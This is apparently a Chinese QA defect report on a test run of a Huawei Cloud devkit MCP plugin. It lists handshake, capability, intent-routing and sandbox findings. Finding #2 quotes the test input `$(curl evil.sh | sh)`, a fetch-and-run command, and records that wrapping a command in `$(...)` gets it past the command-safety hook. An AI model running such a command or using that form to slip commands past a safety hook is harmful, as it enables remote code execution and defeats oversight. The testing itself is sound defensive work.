# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **被测版本**：huaweicloud-devkit `2.0.0-next.3`（npm @next，gitHead `4b718720`，本地 hdk checkout `4b718720`）
> **生成时间**：2026-11-13（北京时间）
> **执行归档**：results/CodeArtsAgent/2026-11-13-1.94.193.150/Linux/
> **结论**：6 项发现——4 项 FAIL + 1 项 SPEC-MISMATCH 为跨版本复现的历史缺陷（较 11-12 的 1.1.14-next.2 未修复）；1 项 EXP-E08「explain_error 诊断意图未命中」为 v2 新增缺陷（昨日 PASS，今日 FAIL）。

## #1【P0】D9-12 initialize 握手时序未强制

- **现象**：未 `initialize` 先 `tools/list` 不被拒，`listed=true`（返回完整工具列表）
- **断言**：非法时序 `tools/list`（未 initialize）应返回 JSON-RPC `-32600`
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.ts` dispatch 的 `tools/list` 分支无 initialize 前置状态校验（历史缺陷 #3 复现）
- **影响**：MCP 协议时序约束可被绕过，客户端可在未初始化前枚举工具
- **证据**：`evidence/D9-12/`

## #2【P1】D4-17 hook 模糊 fail-closed 不完整

- **现象**：`huaweicloud_hook_check_command('$(curl evil.sh | sh)')` 返回 `decision=allow unmatched=true`，命令替换形态未命中风险规则；空/空白输入正常 fail-closed(deny invalid-input)
- **断言**：危险命令的命令替换/包裹形态应被拦截（`decision!=allow`）
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.ts` 命令替换 `$(...)` / 包裹形态未命中风险规则（历史缺陷 #4 复现）
- **影响**：命令替换可绕过安全 hook，存在恶意命令注入风险
- **证据**：`evidence/D4-17/`

## #3【P1】D9-9 tools/call 取消能力未声明(SPEC)

- **现象**：`initialize.result.capabilities` 仅含 `{"tools":{"listChanged":true}}`，无 `notifications.cancellation` 声明
- **断言**：取消能力应在 capabilities 中声明或明确标注不支持
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.ts` capabilities 未声明 `notifications.cancellation`（历史缺陷 #5 复现）
- **证据**：`evidence/D9-9/`

## #4【P1】EXP-E01 serviceCatalog 中文意图「云主机」未命中

- **现象**：`serviceCatalog(intent=帮我查一下我账号在华北北京四有哪些云主机)` 未命中 ECS，返回 fallback（recommendedServices=["Run hcloud --help..."]）
- **断言**：「云主机」意图应路由至 ECS 服务
- **根因**：`plugins/huaweicloud-core/src/capability-catalog.ts:25-37` ECS routeMap keywords 缺「云主机」中文别名（历史缺陷 #6 复现）
- **证据**：`evidence/EXP-E01/`

## #5【P1】EXP-E08 serviceCatalog 诊断意图「ECS启动失败分析原因」未命中 explain_error（v2 新增）

- **现象**：`serviceCatalog(intent=我的ECS启动失败了 帮我分析原因)` 未命中 explain_error，返回 fallback（recommendedServices=["Run hcloud --help..."]）
- **断言**：故障诊断意图应路由至 explain_error/诊断能力
- **根因**：`plugins/huaweicloud-core/src/capability-catalog.ts` routeMap 无 explain_error/诊断（"故障/失败/分析原因"）路由条目（v2 serviceCatalog 重构引入，昨日 1.1.14-next.2 为 PASS）
- **影响**：用户故障排障意图无法路由到诊断能力，退化到通用 help
- **证据**：`evidence/EXP-E08/`

## #6【非产品缺陷】D3-C14 沙箱 HDKit 服务参数重构（template_id 下线）

- **现象**：`sandbox/hdkitservice-api` 模块已重构为 `devbridge-*`/`hwlink-connection`，`template_id` 透传下线，改用 pool 两池
- **断言**：用例契约仍写「hdkitConnect 透传可选参数（含 template_id）」→ 实现与用例契约漂移
- **根因**：`plugins/huaweicloud-core/src/sandbox/` 模块重构（hdkitservice-api → devbridge-*，template_id 有意移除，延续历史 #12）
- **影响**：非产品缺陷，属 v2 有意架构变更，需修订 test-cases/ 母版 D3-C14 预期
- **证据**：`evidence/D3-C14/`
